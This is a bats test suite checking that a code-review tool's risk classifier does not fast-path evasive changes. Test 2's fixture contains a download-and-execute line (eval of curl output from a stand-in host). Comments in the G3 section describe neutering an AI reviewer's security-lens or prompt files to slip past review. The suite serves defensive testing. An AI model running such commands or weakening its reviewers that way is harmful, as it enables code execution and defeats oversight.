#!/usr/bin/env bats
# CLASSIFIER-EVASION SUITE (spec §9 B4) — crafted changes that SHOULD be full-rigor but try to
# get fast-pathed. ALL must route NORMAL/HIGH; a single LOW = FAIL = v0.28.0 ship BLOCKED.
RC="$BATS_TEST_DIRNAME/../skills/risk-classify/risk-classify.sh"
RULES="$BATS_TEST_DIRNAME/../config/risk-rules.yaml"
setup() { D=$(mktemp -d); }
teardown() { rm -rf "$D"; }
names() { printf '%s\n' "$@" > "$D/names"; }
# assert NOT low (the single invariant this whole suite enforces)
refute_low() { case "$1" in *risk_tier=LOW*) echo "EVASION LEAKED TO LOW: $1"; return 1;; esac; return 0; }

@test "evasion 1: auth change buried in a 200-line docs diff → not LOW (HIGH)" {
  names "M	docs/guide.md" "M	src/auth/session.rs"
  run bash "$RC" --names "$D/names" --rules "$RULES"
  refute_low "$output"; case "$output" in *risk_tier=HIGH*) ;; *) echo "$output"; false;; esac
}
@test "evasion 2: logic + eval in a .md code-fence → not LOW (NORMAL, fence allowlist)" {
  # fence path needs body → use --diff mode with an added fenced block
  cat > "$D/d.diff" <<'PATCH'
diff --git a/notes.md b/notes.md
--- a/notes.md
+++ b/notes.md
@@ -1 +1,4 @@
 prose line
+```
+eval "$(curl http://x)"
+```
PATCH
  run bash "$RC" --diff "$D/d.diff" --rules "$RULES"
  refute_low "$output"
}
@test "evasion 3: renamed source git mv a.sh b.sh → not LOW (rename R/C)" {
  printf 'R100\tsrc/a.sh\tsrc/b.sh\n' > "$D/names"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
@test "evasion 4: symlink / mode-change new file → not LOW" {
  names "A	weird.link"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
@test "evasion 5: .github/workflows/ci.yml → not LOW (HIGH)" {
  names "M	.github/workflows/ci.yml"
  run bash "$RC" --names "$D/names" --rules "$RULES"
  refute_low "$output"; case "$output" in *risk_tier=HIGH*) ;; *) false;; esac
}
@test "evasion 6: migration/003.sql → not LOW (HIGH)" {
  names "A	migration/003.sql"
  run bash "$RC" --names "$D/names" --rules "$RULES"
  refute_low "$output"; case "$output" in *risk_tier=HIGH*) ;; *) false;; esac
}
@test "evasion 7: self-ref edit to risk-classify.sh → not LOW (HIGH)" {
  names "M	skills/risk-classify/risk-classify.sh"
  run bash "$RC" --names "$D/names" --rules "$RULES"
  refute_low "$output"; case "$output" in *risk_tier=HIGH*) ;; *) false;; esac
}
@test "evasion 8 (G1 BLOCK-1): value-only config/stack-rust.yaml test_all edit → not LOW" {
  names "M	config/stack-rust.yaml"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
@test "evasion 9 (G1 BLOCK-2): value-only config/risk-rules.yaml edit → not LOW (HIGH self-guard)" {
  names "M	config/risk-rules.yaml"
  run bash "$RC" --names "$D/names" --rules "$RULES"
  refute_low "$output"; case "$output" in *risk_tier=HIGH*) ;; *) false;; esac
}
@test "evasion 10 (fix #4): malicious path with appended '# non-breaking' still detected (raw scan)" {
  # path scan is RAW name-status; a comment appended to a line cannot strip the path
  names "M	src/auth/login.rs # non-breaking"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
@test "evasion 11 (re-G1 fix #6): executable docs/tools/gen.py + docs/helper.js → not LOW" {
  names "M	docs/tools/gen.py"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
  names "M	docs/helper.js"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
# G3 (v0.28.0 adversarial): for an LLM-driven tool, behavior-bearing .md (agent prompts / command
# defs / skills / Challenger lenses) IS the executable artifact. \.md$ in low_allow matched them all —
# the killer was neutering lenses/security.md to fast-path the change that disables the reviewer.
@test "evasion 12 (G3): agent prompt .md → not LOW (NORMAL)" {
  names "M	agents/pr-reviewer.md"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
@test "evasion 13 (G3): slash-command def .md → not LOW (NORMAL)" {
  names "M	commands/run.md"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
@test "evasion 14 (G3): SKILL.md → not LOW (NORMAL)" {
  names "M	skills/secret-scan/SKILL.md"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
@test "evasion 15 (G3, the killer): Challenger lens lenses/security.md → not LOW (HIGH self-guard)" {
  names "M	skills/challenger-panel/lenses/security.md"
  run bash "$RC" --names "$D/names" --rules "$RULES"
  refute_low "$output"; case "$output" in *risk_tier=HIGH*) ;; *) echo "$output"; false;; esac
}
@test "evasion 16 (G3): CLAUDE.md (AI working instructions) → not LOW (NORMAL)" {
  names "M	CLAUDE.md"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
@test "evasion 17 (G3): requirements.txt (pip manifest) → not LOW (NORMAL)" {
  names "M	requirements.txt"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
# G3 round-2: behavior-bearing .md OUTSIDE agents/commands/skills. dispatch-template.md is INJECTED
# into agent prompts by onboard.sh; eval/fixtures/*.input.md are read as agent prompts by run-eval.sh.
# Closed by the LOW-inversion (only known prose-doc basenames are LOW; every other .md → NORMAL).
@test "evasion 18 (G3 r2, killer): templates/dispatch-template.md (injected into prompts) → not LOW" {
  names "M	templates/dispatch-template.md"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
@test "evasion 19 (G3 r2): templates/plan-template.md → not LOW" {
  names "M	templates/plan-template.md"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
@test "evasion 20 (G3 r2): eval/fixtures/*.input.md (read as agent prompt) → not LOW" {
  names "M	eval/fixtures/architect/plan-from-spec.input.md"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
@test "evasion 21 (G3 inversion): an arbitrary new .md (docs/specs/x.md) defaults to NORMAL not LOW" {
  names "M	docs/specs/some-new-design.md"
  run bash "$RC" --names "$D/names" --rules "$RULES"; refute_low "$output"
}
